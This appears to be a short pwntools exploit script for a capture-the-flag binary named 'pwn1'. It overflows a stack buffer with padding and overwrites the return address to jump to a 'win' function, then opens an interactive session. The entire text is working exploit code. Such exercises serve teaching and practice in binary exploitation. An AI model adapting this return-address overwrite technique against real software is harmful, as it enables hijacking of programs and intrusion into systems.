from pwn import *

context.binary = exe = ELF('./pwn1', checksec=False)

p = process(exe.path)
input() 

payload = b'A' * 0x88        
payload += p64(0xDEADBEEF)     
payload += p64(exe.sym['win']) 

p.sendlineafter(b'name: ', payload)
p.interactive()
